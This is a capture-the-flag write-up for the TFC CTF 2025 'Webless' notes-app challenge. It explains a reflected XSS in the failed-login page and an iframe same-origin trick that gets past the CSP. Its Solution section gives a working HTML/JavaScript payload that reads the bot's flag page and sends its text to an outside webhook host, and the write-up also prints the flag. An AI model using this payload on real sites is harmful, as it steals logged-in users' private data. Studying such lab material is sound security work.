## TFC CTF 2025 - Webless writeup


## Challenge Description
![](../untitled-1_20250901140257001.png)
This is basically a notes app where we can post our notes and it is a session based app. You can toggle your note to be hidden that are only visible to us (not relevent). There is a bot that submits the flag into its session and opens a new window with attacker controlled URL. So it is a client side challenge. Can we find a xss 😺pspss? 
## Finding bugs
i assumed that we are dealing with xs-leak (idk why i thought that). But my assumption was destroyed by the CSP the `/post/id` had which is `Content-Security-Policy : script-src 'none'; style-src 'self'` alr... maybe i can import post A into post B and cloud the post A with css selectorss??.. Nope.. nothing..  
  
 But during the process..  i thought how the `<>` and` "` are not being encoded.. example.. \<h1\> are working fine. i went into more digging and found this
 ![](untitled-1_20250901141903345.png)
 In this line `<div id="description">{{ post.description | safe }}</div>` the `safe` lets us embed those html characters without being encoded. And i looked even more into the html pages to find this in the invalid.html  
 ![](untitled-1_20250901142211713.png)
 so.. a failed login with username `<script\>alert(1)` works.. Ha. Bugg 👾
## Attack plan
But the attack seems unclear.. how can we take advantage of a user(bot) that is already logged in.. can we make the user access the invalid page and again the post/0 page without manual login??  yess we can!  
  
 we can take advantage of iframes and SOP policy.. The plan goes like this  
   
 1. We create a iframe inside we trigger the XSS. Since iframes dont send cookie, the session wont be maintained and the xss can be triggered.
 2. The XSS opens a new tab to post/0(flag) 
 3. since the iframe and the new tab is SOP iframe can read the content of the new tab.
 4. we use a webhook to get the flag 
 5. END
## Conclusion
Really cool technique.. took a shower to figure it out myself tho. Felt really good to solve this one. This technique made me go wtff and i thought why not share it. Bye Byee! xxx0xxxx
## Solution

```html
    <iframe src="http://127.0.0.1:5000/login?username=
    <script>
    var w = window.open('/post/0');
    setTimeout(()=>
    {
    if(w)
    {
    window.open('http://webhook.com/aa?q='%2Bw.document.body.children[2].innerText);
    }
    },1500)
    </script>
    &password=a" >
    
    </iframe>
    <!-- <script>setTimeout(()=>{window.reportReady = true;},9000);</script> -->
```
#### Flag
![](untitled-1_20250901144359744.png)
`TFCCTF{1_h4v3_n0_f1ag_ideas_i_hope_you_liked_it_9102}`
